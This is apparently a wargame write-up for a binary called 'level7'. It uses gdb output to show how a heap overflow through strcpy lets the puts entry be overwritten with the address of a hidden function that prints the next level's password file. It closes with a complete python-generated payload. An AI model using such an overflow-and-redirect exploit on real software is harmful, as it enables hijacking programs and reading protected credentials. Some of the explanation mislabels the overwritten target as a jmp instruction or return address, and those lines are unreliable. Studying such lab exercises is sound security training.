When running the program without arguments, we encountered a segmentation fault:
```
./level7
Segmentation fault (core dumped)
```
Upon trying with two arguments, we received a different response:
```
./level7 "eee" "ddd"
~~
```
We disassembled the program and found a global variable `c` and an unused function `m()`. The `m()` function prints the content of the variable `c`.

The `main()` function allocates two string pointers and uses `strcpy` to copy the content from `argv[1]` to `str1` and `argv[2]` to `str2`. Additionally, the program calls `fopen` to read a file from the path `/home/user/level8/.pass` and stores it in the global variable `c` using `fgets`. The program then calls `puts` to print the string `~~`.

We aim to exploit the program by redirecting the execution flow from the `puts` function to the `m()` function, which will print the contents of the global variable `c`.

First, we disassembled the main() function to find the call to `puts`:

```
(gdb) disass main
...
0x080485f0 <+207>:	movl   $0x8048703,(%esp)
0x080485f7 <+214>:	call   0x8048400 <puts@plt>
0x080485fc <+219>:	mov    $0x0,%eax
...
```

The address of the `jmp` instruction is `0x8049928`( `\x28\x99\x04\x08`).

We located the m() function's address using gdb:

```
(gdb) info functions
...
0x080484f4  m
0x08048521  main
...
```

The address of the `m()` function is `0x080484f4`(`\xf4\x84\x04\x08`).

To exploit the program, we need to overwrite the return address of the `puts` function with the address of the `m()` function.

We create the payload as follows:
```
./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```
